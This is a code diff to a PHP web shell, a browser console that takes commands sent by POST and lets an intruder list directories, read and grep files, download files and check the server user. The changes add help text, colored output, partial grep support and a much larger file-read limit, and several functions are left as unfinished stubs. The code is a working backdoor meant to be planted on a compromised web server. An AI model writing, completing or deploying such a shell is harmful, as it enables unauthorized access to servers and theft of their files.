@@ -2,6 +2,11 @@
 
 $current_page_url = (isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on' ? "https" : "http") . "://$_SERVER[HTTP_HOST]$_SERVER[REQUEST_URI]";
 
+define("SUCCESS", "white");
+define("INFO", "grey");
+define("WARNING", "yellow");
+define("ERROR", "red");
+
 if(isset($_POST['cmd'])) {
 
     $input_string = isset($_POST['cmd'])? $_POST['cmd'] : "whoami";
@@ -14,19 +19,32 @@ if(isset($_POST['cmd'])) {
     $show_version = false;
     $show_phpinfo = false;
 
-    function response($b) {
-        echo '<font color="white">' . $b . '</font></br></br>';
-        die();
+    function response($color, $text, $exit) {
+        echo '<font color="' . $color . '">' . $text . '</font></br></br>';
+        if($exit) die();
     }
 
-    function error($b) {
-        echo '<font color="red">' . $b . '</font></br></br>';
-        die();
+    function path_cmd() {
+        global $input_string;
+        echo '<font color="green">' . getcwd()  . ': </font><font color="grey"> '. $input_string .'</font></br></br>';
     }
 
-    function warning($b) {
-        echo '<font color="yellow">' . $b . '</font></br></br>';
-        die();
+    function help($cmd) {
+            switch ($cmd) {
+                case 'ls':
+                    $response = "`ls FOLDER_PATH`  - Same as `ls -la` in bash";
+                    break;
+                case 'whoami':
+                    $response = "`whoami` - Tries to get UID using 'posix_geteuid()'. If the function is disabled, will get owner of webshell file, but this may differ from your UID.";
+                    break;
+                case 'download':
+                    $response = "`download FILE_PATH` - Download file at <file_path>. Make sure to allow your browser to open new tab.";
+                    break;
+                default:
+                    $response = "The following commands are available: `ls`,`cat`, `find`, `grep`, `download`, `upload`, `mkdir`, `whoami`. Type 'help <cmd>' for more details.";
+                    break;
+            }
+            response(SUCCESS, $response, true);
     }
 
     function download($file) {
@@ -45,21 +63,62 @@ if(isset($_POST['cmd'])) {
 
     function ls($path) {
         $response = "";
-        $files = scandir($path);
-        foreach ($files as $f) {
-            $file = $path.'/'.$f;
-            $permissions = fileperms($file);
-            $owner = fileowner($file);
-            $group = filegroup($file);
-            $size = filesize($file);
-            $date = date("F d Y H:i:s.", filectime($file));
-            $response = $response . $permissions."  ".$owner."  ".$group."  ".$size."  ".$date."  ".$f."<br/>";
+        if (file_exists($path)) {
+            $files = scandir($path);
+            foreach ($files as $f) {
+                $file = $path.'/'.$f;
+                $permissions = fileperms($file);
+                $owner = fileowner($file);
+                $group = filegroup($file);
+                $size = filesize($file);
+                $date = date("F d Y H:i:s.", filectime($file));
+                $response = $response . $permissions."  ".$owner."  ".$group."  ".$size."  ".$date."  ".$f."<br/>";
+            }
+        response(SUCCESS, $response, true);
         }
-        response($response);
+        else {
+            response(ERROR, "Folder path not found", true);
+        }
     }
 
+    function find($search, $path) {
+        //search for file with name in path
+    }
+
+    function grep($search, $path) {
+        grep_file($search, $path);
+        /*
+        if file its file, cat it -> search for string, return
+        if file is folder, make for loop and grep for each file
+        */
+    }
+
+    function grep_file($search, $path) {
+        $matches = array();
+
+        $handle = @fopen($path, "r");
+        if ($handle)
+        {
+            while (!feof($handle))
+            {
+                $buffer = fgets($handle);
+                if(strpos($buffer, $search) !== FALSE)
+                    $matches[] = $buffer;
+            }
+            fclose($handle);
+        }
+
+        //show results:
+        print_r($matches);
+
+    }
+
+    function grep_folder($search, $path) {
+
+    } 
+
     function logo() {
-        response("TODO");
+        response(SUCCESS, $response, true);
     }
 
     function cd($path) {
@@ -68,14 +127,14 @@ if(isset($_POST['cmd'])) {
     }
 
     function pwd() {
-        response(getcwd());
+        response(SUCCESS, getcwd(), true);
     }
 
     function whoami() {
         if(function_exists("posix_geteuid"))
-            response('Current script owner uid: ' . posix_geteuid());
+            response(SUCCESS, 'Current script owner uid: ' . posix_geteuid(), true);
         else
-            response('Cannot get current user`s UID. The file owner is: ' . get_current_user() . ' (this may differ from UID)');
+            response(ERROR, 'Cannot get current user`s UID. The file owner is: ' . get_current_user() . ' (this may differ from UID)', true);
     }
 
 
@@ -93,37 +152,43 @@ if(isset($_POST['cmd'])) {
                     $response .= "No </br>";  
             }
         }
-        response($response);
+        response(SUCCESS, $response, true);
     }
 
     function cat($file) {
         if( file_exists($file) ) {
-            if(filesize($file) > 5000){
-                warning("File is too big to display. Use `download` or change souce code idk");
+            if(filesize($file) > 1000000){
+                response(WARNING, "File is too big to display. Use `download` or change souce code idk", true);
             }
             else {
                     $content = file_get_contents($file);
-                    response($content);
+                    response(SUCCESS, '<pre>'.htmlentities($content).'</pre>', true);
                 }
         }
         else{
-            error('File path not found. Type absolute path!');
+            response(ERROR, 'File path not found. Type absolute path!', true);
         }
 
     }
 
+
     switch ($cmd) {
         case 'whoami':
+            path_cmd();
             whoami();
             break;
         case 'pwd':
+            path_cmd();
             pwd();
             break;
         case 'ls':
-            $path = $params[0];
+            $path = getcwd();
+            if(count($params) > 0) $path = $params[0];
+            path_cmd();
             ls($path);
             break;
         case 'cd':
+            path_cmd();
             $path = $params[0];
             cd($path);
             break;
@@ -131,15 +196,26 @@ if(isset($_POST['cmd'])) {
             logo();
             break;
         case 'cat':
+            path_cmd();
             $file = $params[0];
             cat($file);
             break;
+        case 'grep':
+            path_cmd();
+            $search = $params[0];
+            $path = $params[1];
+            grep($search, $path);
+            break;
         case 'download':
+            path_cmd();
             $file = $params[0];
             download($file);
             break;
         default:
-            whoami();
+            $help_cmd = "";
+            if(count($params) > 0) $help_cmd = $params[0];
+            path_cmd();
+            help($help_cmd);
             break;
     }
 } else
@@ -208,10 +284,9 @@ function submit_console(event) {
  font-family:verdana;
  color: grey;
  overflow: auto;
- width:95%;
  height: 95%;
  padding-top: 10px;
- padding-right: 10px;
+ padding-right: 5px;
  padding-left: 10px;
 }
 
@@ -228,10 +303,8 @@ function submit_console(event) {
             <form> 
               <textarea id="cmd_input" rows="1" onkeydown="submit_console(event)" onkeyup="clear_console(event)" cols="250"></textarea> 
             </form> 
-            <form target="_blank" id="download" action="<?php echo $current_page_url ?>" method="post"><input id="download_input" name="cmd" value=""></form>
+            <form target="_blank" id="download" action="<?php echo $current_page_url ?>" method="post"><input type="hidden" id="download_input" name="cmd" value=""></form>
         </div>
     </div>
 </body>
 </html>
-
-
